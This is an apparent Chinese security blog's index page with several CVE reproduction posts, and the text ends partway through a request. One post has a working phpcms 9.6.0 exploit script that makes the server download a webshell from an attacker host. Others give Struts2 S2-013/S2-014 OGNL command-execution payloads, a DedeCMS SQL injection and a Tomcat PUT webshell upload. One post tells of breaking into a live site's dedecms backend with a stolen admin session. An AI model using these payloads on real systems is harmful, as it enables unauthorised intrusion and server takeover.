<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>oxcccccc</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="oxcccccc">
<meta property="og:url" content="https:&#x2F;&#x2F;explorersss.github.io&#x2F;index.html">
<meta property="og:site_name" content="oxcccccc">
<meta property="og:locale" content="zh">
<meta property="article:author" content="ccreater">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="oxcccccc" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 4.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">oxcccccc</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://explorersss.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-phpcms960任意文件上传复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2020-02-12T13:55:39.359Z" itemprop="datePublished">2020-02-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/">phpcms960任意文件上传复现</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="phpcmsv9-6-0任意文件上传"><a href="#phpcmsv9-6-0任意文件上传" class="headerlink" title="phpcmsv9.6.0任意文件上传"></a>phpcmsv9.6.0任意文件上传</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>phpcms v9.6.0</p>
<p>开启用户注册功能</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据网络上提供的poc进行漏洞复现:</p>
<pre><code class="python">import re
import requests


def poc(url):
    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)
    data = {
        &#39;siteid&#39;: &#39;1&#39;,
        &#39;modelid&#39;: &#39;1&#39;,
        &#39;username&#39;: &#39;test&#39;,
        &#39;password&#39;: &#39;testxx&#39;,
        &#39;email&#39;: &#39;test@test.com&#39;,
        &#39;info[content]&#39;: &#39;&lt;img src=http://url/shell.txt?.php#.jpg&gt;&#39;,
        &#39;dosubmit&#39;: &#39;1&#39;,
    }
    rep = requests.post(u, data=data)

    shell = &#39;&#39;
    re_result = re.findall(r&#39;&amp;lt;img src=(.*)&amp;gt&#39;, rep.content)
    if len(re_result):
        shell = re_result[0]
        print shell
</code></pre>
<p>漏洞的关键位置</p>
<p><code>phpcms/modules/member/index.php</code>:135</p>
<pre><code class="php">if($member_setting[&#39;choosemodel&#39;]) {
    require_once CACHE_MODEL_PATH.&#39;member_input.class.php&#39;;
    require_once CACHE_MODEL_PATH.&#39;member_update.class.php&#39;;
    $member_input = new member_input($userinfo[&#39;modelid&#39;]);        
    $_POST[&#39;info&#39;] = array_map(&#39;new_html_special_chars&#39;,$_POST[&#39;info&#39;]);
    $user_model_info = $member_input-&gt;get($_POST[&#39;info&#39;]);                                        
}</code></pre>
<p><code>$_POST[&#39;info&#39;]</code>被<code>new_html_special_chars</code>处理后,直接作为参数传入<code>$member_input-&gt;get</code></p>
<p>跟进去发现</p>
<pre><code class="php">if(is_array($data)) {
            foreach($data as $field=&gt;$value) {
                ...
                $field = safe_replace($field);
                ...
                $func = $this-&gt;fields[$field][&#39;formtype&#39;];
                if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value);

                $info[$field] = $value;
            }
        }</code></pre>
<p><code>$this-&gt;$func($field, $value);</code>令人浮想联翩的命令,而<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>,其中<code>$field</code>是我们可控的输入<code>new_html_special_chars($_POST[&#39;info&#39;]) as $field=&gt;$value</code></p>
<p>而<code>$this-&gt;fields[$field][&#39;formtype&#39;];</code>有以下取值,我们可以控制其执行某一函数</p>
<pre><code class="php">$this-&gt;fields[&#39;catid&#39;][&#39;formtype&#39;]=&quot;catid&quot;
$this-&gt;fields[&#39;typeid&#39;][&#39;formtype&#39;]=&quot;typeid&quot;
$this-&gt;fields[&#39;title&#39;][&#39;formtype&#39;]=&quot;title&quot;
$this-&gt;fields[&#39;keywords&#39;][&#39;formtype&#39;]=&quot;keyword&quot;
$this-&gt;fields[&#39;copyfrom&#39;][&#39;formtype&#39;]=&quot;copyfrom&quot;
$this-&gt;fields[&#39;description&#39;][&#39;formtype&#39;]=&quot;textarea&quot;
$this-&gt;fields[&#39;updatetime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;
$this-&gt;fields[&#39;content&#39;][&#39;formtype&#39;]=&quot;editor&quot;
$this-&gt;fields[&#39;thumb&#39;][&#39;formtype&#39;]=&quot;image&quot;
$this-&gt;fields[&#39;relation&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;
$this-&gt;fields[&#39;pages&#39;][&#39;formtype&#39;]=&quot;pages&quot;
$this-&gt;fields[&#39;inputtime&#39;][&#39;formtype&#39;]=&quot;datetime&quot;
$this-&gt;fields[&#39;posids&#39;][&#39;formtype&#39;]=&quot;posid&quot;
$this-&gt;fields[&#39;groupids_view&#39;][&#39;formtype&#39;]=&quot;groupid&quot;
$this-&gt;fields[&#39;voteid&#39;][&#39;formtype&#39;]=&quot;omnipotent&quot;
$this-&gt;fields[&#39;islink&#39;][&#39;formtype&#39;]=&quot;islink&quot;
$this-&gt;fields[&#39;url&#39;][&#39;formtype&#39;]=&quot;text&quot;
$this-&gt;fields[&#39;listorder&#39;][&#39;formtype&#39;]=&quot;number&quot;
$this-&gt;fields[&#39;template&#39;][&#39;formtype&#39;]=&quot;template&quot;
$this-&gt;fields[&#39;allow_comment&#39;][&#39;formtype&#39;]=&quot;box&quot;
$this-&gt;fields[&#39;status&#39;][&#39;formtype&#39;]=&quot;box&quot;
$this-&gt;fields[&#39;readpoint&#39;][&#39;formtype&#39;]=&quot;readpoint&quot;
$this-&gt;fields[&#39;username&#39;][&#39;formtype&#39;]=&quot;text&quot;</code></pre>
<p>一个一个查看最后发现:</p>
<pre><code class="php">    function editor($field, $value) {
        $setting = string2array($this-&gt;fields[$field][&#39;setting&#39;]);
        $enablesaveimage = $setting[&#39;enablesaveimage&#39;];
        $site_setting = string2array($this-&gt;site_config[&#39;setting&#39;]);
        $watermark_enable = intval($site_setting[&#39;watermark_enable&#39;]);
        $value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);
        return $value;
    }</code></pre>
<p><code>editor</code>会调用download方法,其中<code>$field</code>和<code>$value</code>都是可控的</p>
<p>跟进<code>download</code>:</p>
<pre><code class="php">function download($field, $value,$watermark = &#39;0&#39;,$ext = &#39;gif|jpg|jpeg|bmp|png&#39;, $absurl = &#39;&#39;, $basehref = &#39;&#39;)
    {
        global $image_d;
        $this-&gt;att_db = pc_base::load_model(&#39;attachment_model&#39;);
        $upload_url = pc_base::load_config(&#39;system&#39;,&#39;upload_url&#39;);
        $this-&gt;field = $field;
        $dir = date(&#39;Y/md/&#39;);
        $uploadpath = $upload_url.$dir;
        $uploaddir = $this-&gt;upload_root.$dir;
        $string = new_stripslashes($value);
        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;
        $remotefileurls = array();
        foreach($matches[3] as $matche)
        {
            if(strpos($matche, &#39;://&#39;) === false) continue;
            dir_create($uploaddir);
            $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);
        }
        unset($matches, $string);
        $remotefileurls = array_unique($remotefileurls);
        $oldpath = $newpath = array();
        foreach($remotefileurls as $k=&gt;$file) {
            if(strpos($file, &#39;://&#39;) === false || strpos($file, $upload_url) !== false) continue;
            $filename = fileext($file);
            $file_name = basename($file);
            $filename = $this-&gt;getname($filename);

            $newfile = $uploaddir.$filename;
            $upload_func = $this-&gt;upload_func;
            if($upload_func($file, $newfile)) {
                $oldpath[] = $k;
                $GLOBALS[&#39;downloadfiles&#39;][] = $newpath[] = $uploadpath.$filename;
                @chmod($newfile, 0777);
                $fileext = fileext($filename);
                if($watermark){
                    watermark($newfile, $newfile,$this-&gt;siteid);
                }
                $filepath = $dir.$filename;
                $downloadedfile = array(&#39;filename&#39;=&gt;$filename, &#39;filepath&#39;=&gt;$filepath, &#39;filesize&#39;=&gt;filesize($newfile), &#39;fileext&#39;=&gt;$fileext);
                $aid = $this-&gt;add($downloadedfile);
                $this-&gt;downloadedfiles[$aid] = $filepath;
            }
        }
        return str_replace($oldpath, $newpath, $value);
    }    </code></pre>
<p><code>download</code>用<code>$upload_func($file, $newfile)</code>来下载文件到服务器,而<code>$upload_func=&quot;copy&quot;</code></p>
<p>我们分析一下<code>download</code>函数,<code>$file</code>和<code>$newfile</code>经过的处理</p>
<p><code>$file</code>是<code>$remotefileurls</code>中的值</p>
<pre><code class="php">        $string = new_stripslashes($value);//反转义
        if(!preg_match_all(&quot;/(href|src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;
        $remotefileurls = array();
        foreach($matches[3] as $matche)
        {
            if(strpos($matche, &#39;://&#39;) === false) continue;
            dir_create($uploaddir);
            $remotefileurls[$matche] = $this-&gt;fillurl($matche, &#39;&#39;, &#39;&#39;);
        }</code></pre>
<p>跟进<code>$this-&gt;fillurl</code>,大概功能是,去掉url<code>#</code>后面的东西</p>
<pre><code class="php">function fillurl($surl, $absurl, $basehref = &#39;&#39;) {
        ...
        $pos = strpos($surl,&#39;#&#39;);
        if($pos&gt;0) $surl = substr($surl,0,$pos);
        ...
    }</code></pre>
<p>构造<code>$value=&#39;src=http://evil.com/evil.php#.jpg&#39;</code></p>
<p>我们再看下<code>$newfile</code></p>
<pre><code class="php">$dir = date(&#39;Y/md/&#39;);
$uploaddir = $this-&gt;upload_root.$dir;
$filename = fileext($file);
$filename = $this-&gt;getname($filename);
$newfile = $uploaddir.$filename;</code></pre>
<p><code>$this-&gt;getname</code>:</p>
<pre><code class="php">function getname($fileext){
        return date(&#39;Ymdhis&#39;).rand(100, 999).&#39;.&#39;.$fileext;
    }</code></pre>
<p>webshell的地址为:<code>http://website/uploadfile/date(&#39;Y/md/&#39;)/date(&#39;Ymdhis&#39;).rand(100, 999).php</code></p>
<p>最后payload为:</p>
<pre><code>/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1
post:
info[content]=&lt;img src=&quot;http://evil.com/evil.php&quot;&gt;</code></pre><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><pre><code class="python">import re
import requests
import random

def exp(url,evilurl=&quot;http://xxxxxxx/evil.php&quot;):
    u = &#39;{}/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#39;.format(url)
    data = {
        &#39;siteid&#39;: &#39;1&#39;,
        &#39;modelid&#39;: &#39;1&#39;,
        &#39;username&#39;: &#39;test%d&#39;%random.randint(1,999999),
        &#39;password&#39;: &#39;testxx&#39;,
        &#39;email&#39;: &#39;test%d@test.com&#39;%random.randint(1,999999),
        &#39;info[content]&#39;: &#39;src=%s#.jpg&#39;%evilurl,
        &#39;dosubmit&#39;: &#39;1&#39;,
    }
    rep = requests.post(u, data=data)
    result=re.search(r&quot;VALUES \(&#39;src=(.*)&#39;,&#39;\d*&#39;\)&quot;,rep.text).groups()
    print(rep.text)
    print(result)


exp(&quot;http://127.0.0.1/cms/phpcms/9.6.0&quot;)</code></pre>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/12/phpcms960任意文件上传复现/">https://explorersss.github.io/2020/02/12/phpcms960任意文件上传复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://explorersss.github.io/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/" data-id="ck6jdn5op0000pwv0gsiq3d0s" data-title="phpcms960任意文件上传复现" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-记一次漏洞挖掘" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="article-date">
  <time class="dt-published" datetime="2020-02-11T05:54:56.708Z" itemprop="datePublished">2020-02-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">记一次漏洞挖掘</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="无标题"><a href="#无标题" class="headerlink" title="无标题"></a>无标题</h1><p>某个月黑风高的晚上,我突然想起了我的复古游戏机还差一点库币,于是决定去挖个洞 …….</p>
<p>经过一番惨绝人寰,欲罢不能的信息收集后,我开始了fuzz,然后 ip被ban:(</p>
<p>主要的信息为:</p>
<pre><code>dedecms 5.7sp1 20150618
ZOHO ManageEngine OpManager
adminer 4.6.3</code></pre><p>爆破密码,fuzz文件啥的都干过,dedecms的后台也没爆出来,但是发现他们服务器配置错误,可以浏览目录</p>
<p>把该版本的dedecms之后的更新对比了以下,没发现有啥洞,此时就陷入了僵局</p>
<p>但是,我随手点了一个<code>en</code>的超链接,就发现了一个新的域名!!!!</p>
<p>然后这个域名下的服务,也是dedecms,而后台就是<code>/dede</code></p>
<p>利用前面发现的目录浏览,我成功拿到了<code>admin</code>的session,直接进入后台getshell</p>
<p><strong>一些网站的英文站点可能就是我们的突破口</strong></p>
<p>资产收集真的太重要了,要不是这次运气好,我还不知道啥时候能日掉</p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/11/记一次漏洞挖掘/">https://explorersss.github.io/2020/02/11/记一次漏洞挖掘/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://explorersss.github.io/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" data-id="ck6hh0xql0000jkv0gt8taq0h" data-title="记一次漏洞挖掘" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-DedeCMS 5.7 plusguestbook.php注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2020-02-10T15:49:48.012Z" itemprop="datePublished">2020-02-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">DedeCMS 5.7 plusguestbook.php注入漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DedeCMS-5-7-plus-guestbook-php-注入漏洞"><a href="#DedeCMS-5-7-plus-guestbook-php-注入漏洞" class="headerlink" title="DedeCMS 5.7 plus/guestbook.php 注入漏洞"></a>DedeCMS 5.7 plus/guestbook.php 注入漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>漏洞成功需要条件：</p>
<ol>
<li>php magic_quotes_gpc=off</li>
<li>漏洞文件存在 plus/guestbook.php dede_guestbook 表当然也要存在。</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc:<code>www.xxx.com/plus/guestbook.php?action=admin&amp;job=editok&amp;msg=sebug&#39;&amp;id=存在的留言ID</code></p>
<p><code>/plus/guestbook.php</code>中为对身份进行验证:</p>
<pre><code class="php">if($action==&#39;admin&#39;)
{
    include_once(dirname(__FILE__).&#39;/guestbook/edit.inc.php&#39;);
    exit();
}</code></pre>
<p><code>/plus/guestbook/edit.inc.php</code></p>
<pre><code class="php">if($job==&#39;editok&#39;)
{
    $remsg = trim($remsg);
    if($remsg!=&#39;&#39;)
    {
        //管理员回复不过滤HTML
        if($g_isadmin)
        {
            $msg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.$msg.&quot;&lt;/div&gt;\n&quot;.$remsg; 
            //$remsg &lt;br&gt;&lt;font color=red&gt;管理员回复：&lt;/font&gt;
        }
        else
        {
            $row = $dsql-&gt;GetOne(&quot;SELECT msg From `#@__guestbook` WHERE id=&#39;$id&#39; &quot;);
            $oldmsg = &quot;&lt;div class=\\&#39;rebox\\&#39;&gt;&quot;.addslashes($row[&#39;msg&#39;]).&quot;&lt;/div&gt;\n&quot;;
            $remsg = trimMsg(cn_substrR($remsg, 1024), 1);
            $msg = $oldmsg.$remsg;
        }
    } 
    $msg = HtmlReplace($msg, -1);
    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);
    ShowMsg(&quot;成功更改或回复一条留言！&quot;, $GUEST_BOOK_POS);
    exit();
}</code></pre>
<p>其中:</p>
<pre><code class="php">$msg = HtmlReplace($msg, -1);
    $dsql-&gt;ExecuteNoneQuery(&quot;UPDATE `#@__guestbook` SET `msg`=&#39;$msg&#39;, `posttime`=&#39;&quot;.time().&quot;&#39; WHERE id=&#39;$id&#39; &quot;);</code></pre>
<p>dedecms中的<code>common.inc.php</code>,有这样的一段代码</p>
<pre><code class="php">foreach(Array(&#39;_GET&#39;,&#39;_POST&#39;,&#39;_COOKIE&#39;) as $_request)
    {
        foreach($$_request as $_k =&gt; $_v) 
        {
            if($_k == &#39;nvarname&#39;) ${$_k} = $_v;
            else ${$_k} = _RunMagicQuotes($_v);
        }
    }</code></pre>
<p>它将<code>_GET</code>,<code>_POST</code>,<code>_COOKIE</code>中的变量放出来,而<code>_RunMagicQuotes</code></p>
<pre><code class="php">function _RunMagicQuotes(&amp;$svar)
{
    if(!get_magic_quotes_gpc())
    {
        ...
    }
    return $svar;
}</code></pre>
<p>所以<code>magic_quotes_gpc=off</code>的情况下便会引起sql注入</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://www.seebug.org/vuldb/ssvid-89599" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89599</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="https://explorersss.github.io/2020/02/10/DedeCMS">https://explorersss.github.io/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/](<a href="https://explorersss.github.io/2020/02/10/DedeCMS">https://explorersss.github.io/2020/02/10/DedeCMS</a> 5.7 plusguestbook.php注入漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://explorersss.github.io/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="ck6gmu6la0000ncv0go1n70w4" data-title="DedeCMS 5.7 plusguestbook.php注入漏洞" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-S2-013_S2-014远程代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="dt-published" datetime="2020-02-08T08:03:56.215Z" itemprop="datePublished">2020-02-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">S2-013_S2-014远程代码执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="S2-013-S2-014-远程代码执行漏洞"><a href="#S2-013-S2-014-远程代码执行漏洞" class="headerlink" title="S2-013/S2-014 远程代码执行漏洞"></a>S2-013/S2-014 远程代码执行漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>structs2  版本: 2.0.0 - 2.3.14.1 </p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><p>s2-013</p>
<pre><code>link.action?xxx=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}

// 或

link.action?xxx=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())}</code></pre><p>s2-014</p>
<pre><code>http://localhost:8080/S2-013/link.action?xxxx=${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;ls&quot;))}</code></pre><h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><p>S2-013</p>
<pre><code class="python">import requests

def poc(url):
    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;
    data={
        &#39;xxx&#39;:&#39;&#39;&#39;${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#39;echo structs2_s2-013_vuln_checkflag&#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}&#39;&#39;&#39;
    }
    try :
        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})
        if &quot;structs2_s2-013_vuln_checkflag&quot; in res.text and res.status_code==200:
            return True
    except :
        pass
    return False
</code></pre>
<p>S2-014</p>
<pre><code class="python">import requests

def poc(url):
    url+=&#39;&#39;&#39;/link.action&#39;&#39;&#39;
    data={
        &#39;xxx&#39;:&#39;&#39;&#39;${(#context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false)(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(@java.lang.Runtime@getRuntime().exec(&quot;echo structs2_s2-014_vuln_checkflag&quot;))}&#39;&#39;&#39;
    }
    try :
        res=requests.get(url,params=data,proxies={&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;})
        if &quot;structs2_s2-014_vuln_checkflag&quot; in res.text and res.status_code==200:
            return True
    except :
        pass
    return False
</code></pre>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/08/S2-013_S2-014远程代码执行漏洞/">https://explorersss.github.io/2020/02/08/S2-013_S2-014远程代码执行漏洞/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://explorersss.github.io/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ck6dbb9gv0000pgv052u7ea48" data-title="S2-013_S2-014远程代码执行漏洞" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" class="article-date">
  <time class="dt-published" datetime="2020-02-08T07:28:03.158Z" itemprop="datePublished">2020-02-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/">Tomcat PUT方法任意写文件漏洞CVE-2017-12615</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> Apache Tomcat 7.0.0 - 7.0.79 </p>
<p>平台: Windows </p>
<p> 启用了 HTTP PUT 请求方法  (conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 false)</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>不能直接上传jsp结尾的文件</p>
<p>利用windows平台下:<code>sample.txt::$DATA</code>等价于<code>sample.txt</code>的特性来写shell</p>
<pre><code>PUT /111.jsp::$DATA HTTP/1.1
Host: 10.1.1.6:8080
User-Agent: JNTASS
DNT: 1
Connection: close

